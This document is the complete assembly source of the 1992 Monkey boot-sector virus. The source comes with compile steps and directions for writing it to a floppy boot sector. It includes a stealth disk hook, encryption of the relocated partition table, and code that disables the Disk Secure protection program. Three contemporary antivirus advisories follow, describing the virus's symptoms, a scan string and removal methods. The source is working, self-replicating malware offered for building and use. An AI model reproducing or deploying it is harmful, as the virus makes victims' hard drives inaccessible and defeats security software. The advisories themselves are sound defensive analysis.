
       page    70,80
       Name    Monkey

;*******************************************************
;
;      Monkey written at the city of champions
;       - Edmonton - by UACVRS - Jan 1992.
;
;     Monkey is a full stealth MBR/Boot self-replicating program with
;     no payload but it does not save the HD's partition
;     table in place. When the "infected" computer is booted
;     from a floppy, c: drive will no longer be accessible.
;
;     To compile: masm monkey     (we used MASM 5.0)
;                 link monkey
;                 exe2bin monkey.exe monkey.co
;     Use NU, or debug to copy monkey.co to the boot
;        sector of a floppy. The diskette will not boot
;        but will install itself on the hard drive.
;
;     Bug: It will trash any floppies higher than
;          1.44meg, not deliberately.
;
;*******************************************************

Code   Segment
       Assume  CS:Code,DS:CODE,ES:CODE
       ORG     00H

MAIN:
       JMP     INITIAL

; space above 1fh is for floppy format data

       ORG     1FH
INT_13     EQU     THIS BYTE

          PUSH    DS
          PUSH    SI
          PUSH    DI
          PUSH    AX
          PUSH    CX
          PUSH    DX

          CALL    SET_HEAD

          CMP     AH,02H
          JNZ     END_ACTION

          PUSH    DX
          SUB     AX,AX
          INT     1AH

TIME      EQU $ + 2
          CMP     DL,40H
          POP     DX
          JNB     END_ACTION

          CALL HANDLE_DISK

END_ACTION:
          POP   DX
          POP   CX
          POP   AX
          POP   DI

          PUSH  DX
          PUSH  CX
          PUSH  AX

          CMP   CX,03H                 ; YES, IS SECTOR LESS THAN 3?
          JNB   EXIT_2                 ; NO, EXIT

          CMP   DH,BYTE PTR DS:[SI]    ; Right head?
          JNZ   EXIT_2                 ; NO, EXIT

          CMP   AH,02H                 ; READ ?
          JZ    STEALTH                ; YES, STEALTH

          CMP   AH,03H                 ; WRITE ?
          JNZ   EXIT_2                 ; NO, EXIT
                                       ; YES!
          CMP   DL,80H                 ; HARD DRIVE?
          JB    EXIT_2                 ; NO, EXIT

          SUB   AH,AH            ; else RESET DISK - make HD light blink
          JMP   SHORT EXIT_2           ; EXIT
STEALTH:
          CALL  INT13                  ; READ
          JB    EXIT_3                 ; ERROR?

          CALL  COMP_SIG               ; MY RELATIVE?
          JZ    REDIRECT               ; YES, REDIRECT

          CALL  COMP_PA                ; NO, IS IT PA?
          JZ    REDIRECT               ; YES, REDIRECT

EXIT_0:
          CLC                          ; NO, RESET FLAG
          JMP   SHORT EXIT_3           ; EXIT

REDIRECT:

          CALL  CHSEC        ; CALC. THE SECTOR TO HIDE & PUT IN CL

          MOV   DH,BYTE PTR DS:[SI+1]  ; SET RIGHT HEAD

          POP   AX                     ; RESTORE AX
          CALL  INT13                  ; RE-READ
          CALL  ENCRPT_PBR
          POP   CX                     ; RESTORE CX, DX
          POP   DX
          JMP   SHORT EXIT_4           ; EXIT
EXIT_2:
          CALL  INT13
EXIT_3:
          POP   DS
          POP   DS
          POP   DS
EXIT_4:
          POP   SI
          POP   DS
          RETF  0002H

READ_SEC_1:
          MOV   AX,0201H         ; READ
INT13 PROC NEAR
          PUSHF
          CALL  DWORD PTR CS:INT13_ADDR     ;***********
          RET
INT13 ENDP

HOOK_ENTRY   EQU  THIS BYTE
HOOK:
          INT   12H
          MOV   SI,004CH
          PUSH  SI
          CMP   BYTE PTR CS:HOME_SEC,02H       ; I am in sector 2?
          JZ    SETUP_SPECIAL

SETUP_NORMAL:

          CALL  SHIFT_NORMAL

          MOV   DI,OFFSET INT13_ADDR
          MOV   CX,0002H
          CLD
          REPZ  MOVSW

          JMP   SHORT STORE_SEGMENT

SETUP_SPECIAL:

          CALL  SHIFT_SPECIAL

STORE_SEGMENT:
          POP   SI
          MOV   WORD PTR DS:[SI],OFFSET INT_13  ; STORE MY ENTRY POINT
          MOV   DS:[SI+2],AX            ; STORE MY SEGMENT

PATCH_OVER:

          PUSH  CS
          POP   DS
          CALL  PATCH           ; PATCH OVER
          PUSH  ES              ; PUSH SEGMENT
          MOV   AX,OFFSET JMP_ADDR
          PUSH  AX              ; PUSH ADDRESS
          STI
          RETF                 ; FAR JMP

    JMP_ADDR   EQU THIS BYTE
BOOT:
          MOV   ES,CX
          MOV   BX,SP            ; TO 0000:7C00
          PUSH  CX              ; SAVE JMP SEGMENT
          PUSH  BX

          MOV   DX,0080H         ; HANDLE C:
          CALL  SET_HEAD
          CALL  HANDLE_DISK

BOOT_SEC  EQU $ + 1
          MOV   CL,05H           ; FROM SECTOR 3   ????

BOOT_DISK  EQU $ + 1
          MOV   DX,0100H         ; C:, HEAD 0      ????

          CALL  READ_SEC_1      ; INT 13

          CALL  ENCRPT_PBR

          RETF

HANDLE_DISK PROC NEAR

          ; *** READ SECTOR 1 ***
          SUB   CX,CX
          INC   CX
          PUSH  CX

          MOV   DH,[SI]          ; HEAD
          CALL  READ_SEC_1      ; INT 13
          JB    END_HANDLE_DISK          ; ERROR -> END

          ; *** COMPARE ***
          CALL  COMP_SIG
          JZ    E_2                      ; SAME -> UPDATE MYSELF

          ; *** PA?  ***
          CALL  COMP_PA                  ; Is it Pagett's disksec?
          JNZ   UPDATE_DISK              ; NO

          ; *** OK?  ***
          INC   CX
          CMP   WORD PTR ES:[BX+1FAH],00H ; when this byte in disksec is set
                                          ; to 0 means disksec would not do
                                          ; checksum of partitions - Pagett
                                          ; sucks
          JZ    E_2                       ; SAME -> UPDATE MYSELF

          MOV   WORD PTR ES:[BX+1FAH],00H ; set this to zero
          MOV   CL,1H                     ; write the change back to sector 1
          CALL  WRITE_SEC_1               ;
          JB    END_HANDLE_DISK

          ; *** YES! READ SECTOR 2  ***
          INC   CX              ; yes,Pagette 's disksecure is on sector 1
          MOV   DH,[SI+2]       ; My relative is on sector 2 - read sector 2
          CALL  READ_SEC_1      ; INT 13
          JB    END_HANDLE_DISK ; ERROR -> END
          POP   AX
          PUSH  CX

UPDATE_DISK:
          CALL  CHSEC        ; CALC. THE SECTOR TO HIDE & PUT IN CL
          CALL  ENCRPT_PBR
          INC   SI
          CALL  WRITE_SEC_1
          DEC   SI
          JB    END_HANDLE_DISK

          CALL  ENCRPT_PBR
          PUSH  CX
          CALL  PATCH
          POP   CX

          PUSH  DX
          CMP   DL,80H
          JNB   E_1
          XOR   DL,DL
E_1:
          MOV   WORD PTR ES:[BX+BOOT_DISK],DX
          POP   DX
          MOV   BYTE PTR ES:[BX+BOOT_SEC],CL
          POP   CX
          PUSH  CX
          MOV   BYTE PTR ES:[BX+OFFSET HOME_SEC],CL
          MOV   WORD PTR ES:[BX+OFFSET BOOT_SIG],0AA55H

E_2:
          CALL  WRITE_SEC_1

END_HANDLE_DISK:
          POP   AX
          RET

HANDLE_DISK ENDP

WRITE_SEC_1 PROC NEAR
          MOV  DH,[SI]
WRITE_SEC_2:
          MOV  AX,0301H
          CALL INT13
          RET
WRITE_SEC_1 ENDP

COMP_SIG PROC NEAR
   CMP     ES:[BX+OFFSET PROG_SIG],9219H
   RET
COMP_SIG   ENDP

COMP_PA PROC NEAR
   CMP   WORD PTR ES:[BX+119H],6150H   ; PA?
   RET
COMP_PA    ENDP

HOME_SEC    DB     01H

FLOPPY_HEAD DB     00H,01H,01H
HARD_HEAD   DB     00H,00H,00H

                  ;  360 720 1.2 1.44
FLOP_SECT_TABLE   DB  02H,05H,09H,0BH
SAVE_SECT_TABLE   DB  03H,05H,0EH,0EH

CHSEC PROC NEAR
   PUSH    DI
   PUSH    SI
   MOV     AL,ES:[BX+14H]
   MOV     CX,0004H
CHSEC_1:
   MOV     SI,CX
   DEC     SI
   CMP     FLOP_SECT_TABLE[SI],AL
   JZ      CHSEC_END_1
   LOOP    CHSEC_1
   MOV     CL,03H
   JMP     SHORT CHSEC_END_2
CHSEC_END_1:
   MOV     CL,SAVE_SECT_TABLE[SI]
CHSEC_END_2:
   POP     SI
   POP     DI
   RET
CHSEC      ENDP

SHIFT_NORMAL PROC NEAR
 ; FIND THE SEGMENT TO HIDE
    DEC    AX
    MOV    DS:[413H],AX

SHIFT_SPECIAL:
    MOV    CL,06H
    SHL    AX,CL
    ADD    AL,20H
    MOV    ES,AX
    RET
SHIFT_NORMAL     ENDP

PATCH PROC NEAR         ; PATCH ON BOOT SECTOR STARTING AT BYTE int_13
    PUSH  SI
    MOV   DI,BX
    MOV   SI,OFFSET INT_13
    ADD   DI,SI
;   CLD
    MOV   CX,OFFSET PROG_END - OFFSET INT_13
    REPZ  MOVSB

PATCH_JMP:
    MOV   DI,BX

    SUB   SI,SI
    MOV   CL,3H
    REPZ  MOVSB

    POP   SI
    RET
PATCH     ENDP

SET_HEAD PROC NEAR
    PUSH  CS
    POP   DS

    MOV   SI,OFFSET FLOPPY_HEAD
    CMP   DL,80H
    JB    SET_HEAD_EXIT
    MOV   SI,OFFSET HARD_HEAD
SET_HEAD_EXIT:
    RET
SET_HEAD  ENDP

INITIAL:
      CLI
      SUB   BX,BX
      MOV   DS,BX
      MOV   SS,BX
      MOV   SP,7C00H
      JMP   HOOK
      NOP
      NOP

ENCRPT_PBR:
      PUSH    DI
      PUSH    CX
      PUSH    AX

      MOV     DI,BX
      MOV     CX,200H

      CLD
ENCRPT_1:
      MOV     AL,ES:[DI]
ENCRPT_CODE   EQU $ + 0001H
      XOR     AL,2EH
      STOSB
      LOOP    ENCRPT_1

      POP     AX
      POP     CX
      POP     DI
      RET


             ORG 01F4H
;PROG_NAME   DB     "Monkey"
PROG_NAME   DB     6dh,8fh,8eh,8bh,85h,99h

             ORG 01FAH
PROG_SIG    DB     19H,92H

PROG_END    EQU   THIS BYTE

            ORG 01FCH
INT13_ADDR  DB     00H,00H

            ORG 01FEH
BOOT_SIG    DB     55H,0AAH
PROG_TAIL   EQU   THIS BYTE

PROG_LEN    EQU   OFFSET PROG_END - OFFSET INT_13


CODE      ENDS
      END MAIN

; from U of A
NEW COMPUTER VIRUS THREAT                   Posted: July 9, 1992

MONKEY VIRUSES ON PCs

The Monkey viruses are main boot record/boot sector infectors,
derived from the Empire D virus. Two variants of the Monkey virus
have been identified. Of particular concern is the fact these
viruses can infect computers protected by the Disk Secure program,
while causing no noticeable changes. Symptoms of infection for
those computers without Disk Secure include memory reduction and
hard drive partitions which are not accessible when booting up
with a floppy disk. When the viruses are active on computers
without Disk Secure, total memory will be reduced by 1,024 bytes.

Monkey viruses destroy partition table data. If an infected system
is booted up from a clean boot disk, DOS claims to be unable to
access the hard drive partitions. A DIR C: command will return the
message, "Invalid drive specification."

Detection

The simplest method of detection involves recognizing a 1K
decrease in memory. The DOS commands CHKDSK and MEM will return 1K
less "total conventional memory" than is normal.

Of the popular virus scanning products, only F-PROT version 2.04A
finds the Monkey viruses, calling them a "New variant of Stoned."
It will identify the virus in memory as well. The F-PROT Virstop
driver does not recognize the Monkey viruses on boot-up.

Disk Secure version 1.15a (ds115a.zip) has a version of the CHKSEC
program that will notice the presence of the Monkey viruses. Note
that Disk Secure itself will not detect the infection: it is
important that the CHKSEC command be called from the autoexec.bat
file.

As well, a special program to find and remove the Monkey viruses,
called KILLMONK, has been written at the University of Alberta.

Removal

To clean a hard disk: If you have previously saved a copy of the
clean main boot record (MBR), then this can be restored. (Many
anti-virus products have an automated way of doing this.) If you
don't have a copy of the original MBR, and don't know what values
your partition table should have, then the KILLMONK program will
restore the partition table for you.

To restore diskettes: Use the KILLMONK program.

The newest version of F-PROT (version 2.04A) and the KILLMONK
program, are both available, free of charge, from Computing and
Network Services. Bring a formatted diskette to the Microcomputer
Demonstration Centre (MDC), in the basement of the Bookstore, or a
ready-made diskette can be purchased for $2.00 from the CNS User
Support Centre at 302 General Services Building. These programs
can also be downloaded from the MTS account VIR.

;From: martin@cs.ualberta.ca (Tim Martin; FSO; Soil Sciences)
Subject: WARNING - new viruses, Monkey.1 and Monkey.2 (PC)
Date: 20 Jul 92 09:10:09 GMT

Virus Name:  MONKEY.1, MONKEY.2  (Empire variants)
V Status:    New
Discovery:   February, 1992
Symptoms:    Memory reduction, hard drive partitions not accessible on
             floppy bootup.
Origin:      Alberta, Canada
Eff. Length: 512 bytes
Type Code:   BPRtS (Boot and Partition table infector - Resident TOM -
             Stealth)
Detection:   CHKDSK, F-PROT 2.04, CHKSEC from Disk Secure 1.15, KILLMONK
Removal:     Cold boot from clean, write-protected floppy, replace MBR
(hard
             disk) or Boot Sector (floppy).

General Comments:
The Monkey viruses are Main Boot Record / Boot Sector infectors,
derived from the Empire D virus.  Two variants of the Monkey virus
have been identified: their most obvious difference is in the initial
bytes at offset 0:
Monkey.1:    E9 CD 01      (JMP 02D0)
Monkey.2:    EB 1E 90      (JMP 0020 ; NOP)

Both variants keep the original sector's data at offset 03h - 1fh.  In
boot sectors, this region contains data required to identify the
diskette format.  This solves the problem noticed with earlier
variants of Empire, whereby infected 720k diskettes were sometimes
unreadable.

The Monkey viruses take 1k from the top of memory.  When active, total
memory will be reduced by 1024 bytes.

The Monkey viruses use stealth to protect both the MBR and diskette
boot sectors.  When active in memory, Int 13h calls cannot access the
infected sector of either hard disks or floppies.

The Monkey viruses are not polimorphic.  They do not encode any of the
virus, as was done by some of the earlier Empire variants.  But before
saving the clean MBR or boot sector to a hiding place, the Monkey
viruses do encode that sector, using an "XOR 2Eh".  This creates a
problem for any disinfecting program that recover the initial boot
sector or MBR by copying it from the hiding place.

When a hard disk is infected, the encoded MBR is put at side 0,
cylinder 0, sector 3.

When a floppy diskette is infected, the original boot sector is placed
in the bottom sector of the root directory.  This means directory
entries will be lost only if the root directory is nearly full -- more
than 96 entries on double density diskettes, or more than 208 entries
on high density diskettes.  The virus is designed to identify only the
four most common diskette formats.  If the diskette is not of a
recognized format, the boot sector is put on side 1, sector 3.  I have
no idea what would happen to a 2.88Mb diskette, but I suspect the
virus would damage the File Allocation Table, causing loss of data.

The Monkey viruses do not put any messages to the screen at any time,
but the virus code does contain, encrypted, the string "Monkey",
followed by bytes 1992h.  It may be significant that the chinese Year
of the Monkey began in February 1992.

The most remarkable characteristic of the Monkey viruses is that they
were designed as an attack on Padgett Peterson's "Disk Secure"
product.  When a computer is booted from an infected diskette, the
virus first checks whether Disk Secure is on the hard disk.  If it is,
the virus puts itself in sector 2, rather than sector 1, and slightly
modifies Disk Secure, so that Disk Secure will load the virus after
Disk Secure has checked the system and loaded itself.  The monkey
viruses install themselves and above Disk Secure, in memory, at offset
200h.

The Monkey viruses do not save the partition table data in place, so
if an infected system is booted from a clean boot disk, DOS claims to
be unable to access the hard drive partitions.  A DIR C: command will
return "Invalid drive specification".

Detection:
Of the popular virus scanning products, only F-PROT 2.04 finds the
Monkey viruses, calling them a "New variant of stoned".  It will
identify the virus in memory as well.  The F-PROT Virstop driver does
not recognise the Monkey viruses, on boot-up.

Disk Secure v. 1.15a (ds115a.zip) has a version of CHKSEC that will
notice the presence of the Monkey viruses.  Notice that Disk Secure
itself will not detect the infection: it is important that the CHKSEC
command be called from the autoexec.bat file.

The simplest detection still involves recognizing a 1k decrease in
memory.  CHKDSK and MEM will return 1k less "total conventional
memory" than normal.

A special program to find and remove the Monkey viruses, called
KILLMONK, has been written at the University of Alberta.  I hope to
make this available to the anti-virus community shortly.

Removal:
The undocumented /MBR option of FDISK does remove the Monkey virus
from the MBR, provided the computer was booted from a clean floppy,
but it does not restore the correct partition table values.  The
problem is that the partition table is not in place in sector one: the
table is encoded, in sector 3.

To clean a hard disk: If you have previously saved a copy of the clean
MBR, then this can be restored.  (Many anti-virus products have an
automated way of doing this.)  If you don't have a copy of the
original MBR, and don't know what values your partition table should
have, then the KILLMONK program may be what you need.

To restore diskettes: Padgett Peterson's FIXFBR works very well,
though it doesn't recognize that the disk is infected.  Another
alternative is the KILLMONK program.

Scan String:
The following hexidecimal string is in both variants of Monkey.  It is
from the code the virus uses to recognize itself.
   26 81 bf fa 01 19 92 c3 26 81 bf 19 01 50 61

Tim

  ;   From F-PROT

 Name: Monkey
 Type: Boot  MBR  Stealth

 The Monkey virus was first discovered in Edmonton, Canada, in the
 year 1991. The virus spread quickly to USA, Australia and UK.
 Monkey is one of the most common boot sector viruses.

 As the name indicates, Monkey is a distant relative of Stoned.
 Its technical properties make it quite a remarkable virus,
 however. The virus infects the Master Boot Records of hard disks
 and the DOS boot records of diskettes, just like Stoned. Monkey
 spreads only through diskettes.

 Monkey does not let the original partition table remain in its
 proper place in the Master Boot Record, as Stoned does. Instead
 it moves the whole Master Boot Record to the hard disk's third
 sector, and replaces it with its own code. The hard disk is
 inaccesible after a diskette boot, since the operating system
 cannot find valid partition data in the Master Boot Record -
 attempts to use the hard disk result in the DOS error message
 "Invalid drive specification".

 When the computer is booted from the hard disk, the virus is
 executed first, and the hard disk can thereafter be used
 normally. The virus is not, therefore, easily noticeable, unless
 the computer is booted from a diskette.

 The fact that Monkey encrypts the Master Boot Record besides
 relocating it on the disk makes the virus still more difficult to
 remove. The changes to the Master Boot Record cannot be detected
 while the virus is active, since it rerouts the BIOS-level disk
 calls through its own code. Upon inspection, the hard disk seems
 to be in its original shape.

 The relocation and encryption of the partition table render two
 often-used disinfection procedures unviable. One of these is the
 MS-DOS command FDISK /MBR, capable of removing most viruses that
 infect Master Boot Records. The other is using a disk editor to
 restore the Master Boot Record back on the zero track. Although
 both of these procedures destroy the actual virus code, the
 computer cannot be booted from the hard disk afterwards.

 There are five different ways to remove the Monkey
 virus:
 o       The original Master Boot Record and partition table can
         be restored from a backup taken before the infection.
         Such a backup can be made by using, for example, the
         MIRROR /PARTN command of MS-DOS 5.

 o       The hard disk can be repartitioned by using the FDISK
         program, after which the logical disks must be formatted.
         All data on the hard disk will consequently be lost,
         however.

 o       The virus code can be overwritten by using FDISK/MBR, and
         the partition table restored manually. In this case, the
         partition values of the hard disk must be calculated and
         inserted in the partition table with the help of a disk
         editor. The method requires expert knowledge of the disk
         structure, and its success is doubtful.

 o       It is possible to exploit Monkey's stealth capabilities
         by taking a copy of the zero track while the virus is
         active. Since the virus hides the changes it has made,
         this copy will actually contain the original Master Boot
         Record. This method is not recommendable, because the
         diskettes used in the copying may well get infected.

 o       The original zero track can be located, decrypted and
         moved back to its proper place. As a result, the hard
         disk is restored to its exact original state. F-PROT uses
         this method to disinfect the Monkey virus.

 It is difficult to spot the virus, since it does not activate in
 any way.  A one-kilobyte reduction in DOS memory is the only
 obvious sign of its presence. The memory can be checked with, for
 instance, DOS's CHKDSK and MEM programs. However, even if MEM
 reports that the computer has 639 kilobytes of basic memory
 instead of the more common 640 kilobytes, it does not necessarily
 mean that the computer is infected. In many computers, the BIOS
 allocates one kilobyte of basic memory for its own use.

 The Monkey virus is quite compatible with different diskette
 types. It carries a table containing data for the most common
 diskettes. Using this table, the virus is able to move a
 diskette's original boot record and a part of its own code to a
 safe area on the diskette. Monkey does not recognize 2.88
 megabyte ED diskettes, however, and partly overwrites their File
 Allocation Tables.


